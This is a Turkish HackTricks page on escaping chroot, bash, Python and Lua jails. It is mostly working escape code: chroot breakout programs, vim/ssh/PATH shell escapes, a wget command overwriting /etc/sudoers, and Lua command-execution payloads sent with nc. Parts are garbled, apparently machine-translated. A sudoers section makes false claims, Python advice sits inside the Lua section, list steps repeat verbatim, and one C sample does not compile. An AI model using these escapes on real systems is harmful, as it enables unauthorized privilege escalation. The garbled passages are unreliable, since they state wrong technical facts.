# Sınırlı Hapishaneden Kaçma

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## **GTFOBins**

**"Shell" özelliğine sahip herhangi bir ikili dosyayı çalıştırabilir misiniz diye arama yapın** [**https://gtfobins.github.io/**](https://gtfobins.github.io)

## Chroot Kaçışları

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)'dan: Chroot mekanizması, **yetkili** (**root**) **kullanıcılar** tarafından kasıtlı olarak manipülasyona karşı korunmak için tasarlanmamıştır. Çoğu sistemde, chroot bağlamları düzgün bir şekilde yığılmaz ve yeterli ayrıcalıklara sahip chrooted programlar, **kaçmak için ikinci bir chroot yapabilir**.\
Genellikle bu, kaçmak için chroot içinde root olmanız gerektiği anlamına gelir.

{% hint style="success" %}
**chw00t** [**aracı**](https://github.com/earthquake/chw00t), aşağıdaki senaryolardan istifade etmek ve `chroot`'tan kaçmak için oluşturulmuştur.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Bir chroot içinde **root** iseniz, **başka bir chroot oluşturarak** kaçabilirsiniz. Bu, 2 chroot'un (Linux'ta) bir arada bulunamaması anlamına gelir, bu yüzden bir klasör oluşturup ardından **dışında olduğunuz yeni chroot**'u bu yeni klasöre oluşturursanız, artık **yeni chroot'un dışında** olacaksınız ve bu nedenle FS içinde olacaksınız.

Bu genellikle chroot'un çalışma dizinini belirtilene taşımadığı için chroot oluşturabilirsiniz, ancak dışında olabilirsiniz.
{% endhint %}

Genellikle bir chroot hapishanesinin içinde `chroot` ikili dosyasını bulamazsınız, ancak bir ikili dosyayı **derleyebilir, yükleyebilir ve çalıştırabilirsiniz**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>

Perl, birçok Linux sistemde bulunan bir betikleme dilidir. Sınırlı bir Bash kabuğundan kaçmak için Perl kullanabilirsiniz. Aşağıda, Perl'i kullanarak sınırlı bir Bash kabuğundan nasıl kaçabileceğinizi gösteren bir örnek bulunmaktadır:

```perl
perl -e 'exec "/bin/sh";'
```

Bu komut, Perl'i kullanarak `/bin/sh` kabuğunu çalıştırır. Bu, sınırlı bir Bash kabuğundan kaçmanıza olanak sağlar ve daha fazla ayrıcalık elde etmenizi sağlar.

</details>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Kaydedilen fd

{% hint style="warning" %}
Bu, önceki duruma benzer, ancak bu durumda **saldırgan mevcut dizine bir dosya tanımlayıcısı kaydeder** ve ardından **yeni bir klasörde chroot oluşturur**. Son olarak, chroot dışında **bu FD'ye erişimi olduğu için** ona erişir ve **kaçar**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD, Unix Domain Sockets üzerinden iletilir, bu yüzden:

* Bir çocuk süreç oluşturun (fork)
* Ebeveyn ve çocuk konuşabilsin diye UDS oluşturun
* Çocuk süreçte farklı bir klasöre chroot çalıştırın
* Ebeveyn süreçte, yeni çocuk sürecin chroot'un dışında olan bir klasörün FD'sini oluşturun
* UDS kullanarak o FD'yi çocuk sürece geçirin
* Çocuk süreç o FD'ye chdir yapar ve chroot'un dışında olduğu için hapisten kaçar
{% endhint %}

### &#x20;Root + Mount

{% hint style="warning" %}
* Root cihazını (/) chroot içindeki bir dizine bağlama
* O dizine chroot yapma

Bu Linux'ta mümkündür
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Procfs'i chroot içindeki bir dizine bağlayın (henüz bağlı değilse)
* Farklı bir kök/cwd girişi olan bir pid arayın, örneğin: /proc/1/root
* Bu girişe chroot yapın
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Bir Fork (çocuk süreç) oluşturun ve FS'nin daha derininde farklı bir klasöre chroot yapın ve ona CD yapın
* Ebeveyn süreçten, çocuk sürecin chroot'un öncesindeki bir klasöre taşıyın
* Bu çocuk süreç chroot'un dışında bulunacaktır
{% endhint %}

### ptrace

{% hint style="warning" %}
* Eskiden kullanıcılar kendi süreçlerini kendi süreçlerinden hata ayıklarlar... ancak bu artık varsayılan olarak mümkün değil
* Yine de, mümkünse, bir sürece ptrace yapabilir ve içinde bir shellcode çalıştırabilirsiniz ([bu örneğe bakın](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Hapishaneleri

### Sorgulama

Hapishane hakkında bilgi alın:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### PATH Değiştirme

PATH ortam değişkenini değiştirebileceğinizi kontrol edin.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Vim Kullanımı

Bir sınırlı kabukta çalışırken, bazen sınırlamaları aşmak için Vim'i kullanabilirsiniz. Vim, bir metin düzenleyici olarak kullanılabilir ve bazı sınırlı kabuklarda çalışan komutları çalıştırmak için kullanılabilir.

1. İlk olarak, Vim'i açmak için aşağıdaki komutu kullanın:

   ```bash
   vim
   ```

2. Vim açıldığında, "Normal" modda olacaksınız. Komutları girmek için "Komut" moduna geçmek için `:` tuşuna basın.

3. Sınırlı kabukta çalıştırmak istediğiniz komutu girin. Örneğin, bir dosya listelemek için `ls` komutunu kullanmak istiyorsanız, aşağıdaki gibi girin:

   ```bash
   :!ls
   ```

4. Komutu çalıştırmak için Enter tuşuna basın. Sonuçlar Vim penceresinde görünecektir.

5. Komutun çıktısını inceledikten sonra, Vim'i kapatmak için `:q` komutunu kullanabilirsiniz.

Vim'i kullanarak sınırlı kabuklardan kaçınmak, bazı durumlarda sınırlamaları aşmanın etkili bir yoludur. Ancak, bu yöntem her zaman çalışmayabilir ve dikkatli olmanız gerekmektedir.
```bash
:set shell=/bin/sh
:shell
```
### Script oluştur

_/bin/bash_ içeriğiyle çalıştırılabilir bir dosya oluşturup oluşturamadığınızı kontrol edin.
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH üzerinden bash almak

Eğer ssh üzerinden erişim sağlıyorsanız, bir bash kabuğunu çalıştırmak için bu hileyi kullanabilirsiniz:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Bildirim

Bir sınırlı kabuk ortamından kaçmak için kullanılan birkaç yöntem vardır. Bu yöntemler, sınırlı bir kabukta çalışan bir kullanıcının yetkilerini artırmak için kullanılır. Aşağıda, bu yöntemlerin bazıları açıklanmaktadır:

#### 1. Sudo Yetkilerini Kullanma

Bir kullanıcının sudo yetkilerini kullanarak sınırlı bir kabuktan kaçması mümkündür. Sudo, belirli komutları kök kullanıcı olarak çalıştırmak için kullanılır. Kullanıcı, sudo komutunu kullanarak kök yetkilerine sahip bir komut çalıştırabilir ve böylece sınırlı kabuktan kaçabilir.

Örnek kullanım:

```bash
sudo /bin/bash
```

Bu komut, `/bin/bash` kabuğunu kök kullanıcı olarak çalıştırır.

#### 2. Sudoers Dosyasını Düzenleme

Sudoers dosyası, sudo yetkilerini düzenlemek için kullanılır. Bu dosyayı düzenleyerek, sınırlı bir kabuktan kaçmak için kullanıcının sudo yetkilerini değiştirebilirsiniz. Sudoers dosyasını düzenlemek için `visudo` komutunu kullanabilirsiniz.

Örnek kullanım:

```bash
sudo visudo
```

Bu komut, sudoers dosyasını düzenlemek için visudo editörünü açar.

#### 3. Sudoers Dosyasında Yeni Bir Kullanıcı Eklemek

Sudoers dosyasına yeni bir kullanıcı ekleyerek, bu kullanıcının sınırlı bir kabuktan kaçmasını sağlayabilirsiniz. Yeni bir kullanıcı eklemek için sudoers dosyasını düzenleyebilirsiniz.

Örnek kullanım:

```bash
sudo visudo
```

Bu komut, sudoers dosyasını düzenlemek için visudo editörünü açar. Ardından, dosyaya yeni bir kullanıcı ekleyebilirsiniz.

#### 4. Sudoers Dosyasında Komutları Kısıtlama

Sudoers dosyasında komutları kısıtlamak, sınırlı bir kabuktan kaçmak için kullanıcının yetkilerini artırabilir. Sudoers dosyasını düzenleyerek, kullanıcının sadece belirli komutları kök kullanıcı olarak çalıştırmasına izin verebilirsiniz.

Örnek kullanım:

```bash
sudo visudo
```

Bu komut, sudoers dosyasını düzenlemek için visudo editörünü açar. Ardından, kullanıcının yetkilerini kısıtlayabilirsiniz.

#### 5. Sudoers Dosyasında Çalışma Süresini Uzatma

Sudoers dosyasında çalışma süresini uzatmak, sınırlı bir kabuktan kaçmak için kullanıcının daha fazla zaman kazanmasını sağlar. Sudoers dosyasını düzenleyerek, kullanıcının sudo yetkilerini daha uzun süre kullanmasına izin verebilirsiniz.

Örnek kullanım:

```bash
sudo visudo
```

Bu komut, sudoers dosyasını düzenlemek için visudo editörünü açar. Ardından, kullanıcının çalışma süresini uzatabilirsiniz.

Bu yöntemler, sınırlı bir kabuktan kaçmak için kullanılan bazı temel tekniklerdir. Her bir yöntem, kullanıcının yetkilerini artırmak için farklı bir yaklaşım sunar.
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Örneğin sudoers dosyasını üzerine yazabilirsiniz.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Diğer hileler

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**Ayrıca ilginç olabilecek sayfa:**

{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
{% endcontent-ref %}

## Python Hapishaneleri

Python hapishanelerinden kaçma hakkında hileler aşağıdaki sayfada bulunabilir:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Hapishaneleri

Bu sayfada lua içinde erişebileceğiniz global fonksiyonları bulabilirsiniz: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Komut yürütme ile değerlendirme:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Bir kütüphanenin fonksiyonlarını noktalar kullanmadan çağırmak için bazı hileler:

- **Using the `import` statement**: You can import the library and then call its functions directly without using dots. For example, instead of `library.function()`, you can use `import library; library.function()`.

- **Using the `from` statement**: You can use the `from` statement to import specific functions from the library and then call them without using dots. For example, instead of `library.function()`, you can use `from library import function; function()`.

- **Using the `getattr()` function**: The `getattr()` function allows you to dynamically access an object's attributes or methods by name. You can use it to call functions of a library without using dots. For example, `getattr(library, 'function')()`.

- **Using the `locals()` or `globals()` functions**: These functions return a dictionary of the current local or global symbol table, respectively. You can use them to access the functions of a library without using dots. For example, `locals()['library']['function']()` or `globals()['library']['function']()`.

- **Using the `exec()` function**: The `exec()` function allows you to execute dynamically generated code. You can use it to call functions of a library without using dots. For example, `exec('library.function()')`.
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
# Kütüphane Fonksiyonlarını Sıralama:

Bir kütüphanenin fonksiyonlarını sıralamak, kütüphanenin içerdiği kullanılabilir fonksiyonları belirlemek için önemli bir adımdır. Bu adım, kütüphanenin sağladığı işlevleri anlamak ve kullanmak için gereklidir.

Aşağıdaki adımları izleyerek bir kütüphanenin fonksiyonlarını sıralayabilirsiniz:

1. Kütüphaneyi yükleyin veya içe aktarın.
2. Kütüphanenin belgelerini veya dokümantasyonunu kontrol edin. Bu belgeler, kütüphanenin fonksiyonlarını ve bunların nasıl kullanılacağını açıklar.
3. Kütüphanenin kaynak kodunu inceleyin. Kaynak kodu, kütüphanenin iç yapısını ve içerdiği fonksiyonları gösterir.
4. Kütüphanenin hedef platformunda çalışan örnek uygulamaları araştırın. Bu uygulamalar, kütüphanenin nasıl kullanıldığını ve hangi fonksiyonların kullanıldığını gösterir.
5. Kütüphanenin hedef platformunda çalışan örnek uygulamaları inceleyin. Bu uygulamalar, kütüphanenin nasıl kullanıldığını ve hangi fonksiyonların kullanıldığını gösterir.
6. Kütüphanenin hedef platformunda çalışan örnek uygulamaları inceleyin. Bu uygulamalar, kütüphanenin nasıl kullanıldığını ve hangi fonksiyonların kullanıldığını gösterir.
7. Kütüphanenin hedef platformunda çalışan örnek uygulamaları inceleyin. Bu uygulamalar, kütüphanenin nasıl kullanıldığını ve hangi fonksiyonların kullanıldığını gösterir.
8. Kütüphanenin hedef platformunda çalışan örnek uygulamaları inceleyin. Bu uygulamalar, kütüphanenin nasıl kullanıldığını ve hangi fonksiyonların kullanıldığını gösterir.
9. Kütüphanenin hedef platformunda çalışan örnek uygulamaları inceleyin. Bu uygulamalar, kütüphanenin nasıl kullanıldığını ve hangi fonksiyonların kullanıldığını gösterir.
10. Kütüphanenin hedef platformunda çalışan örnek uygulamaları inceleyin. Bu uygulamalar, kütüphanenin nasıl kullanıldığını ve hangi fonksiyonların kullanıldığını gösterir.

Bu adımları takip ederek bir kütüphanenin fonksiyonlarını sıralayabilir ve kütüphaneyi daha etkili bir şekilde kullanabilirsiniz.
```bash
for k,v in pairs(string) do print(k,v) end
```
Dikkat edin, önceki tek satırlığı her çalıştırdığınızda **fonskiyonların sırası değişir**. Bu nedenle belirli bir fonksiyonu çalıştırmak istiyorsanız, farklı lua ortamlarını yükleyerek ve le kütüphanesinin ilk fonksiyonunu çağırarak brute force saldırısı gerçekleştirebilirsiniz:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Etkileşimli lua kabuğu alın**: Sınırlı bir lua kabuğu içindeyseniz, yeni bir lua kabuğu (ve umarım sınırsız) almak için aşağıdaki komutu kullanabilirsiniz:
```bash
debug.debug()
```
## Referanslar

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slaytlar: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
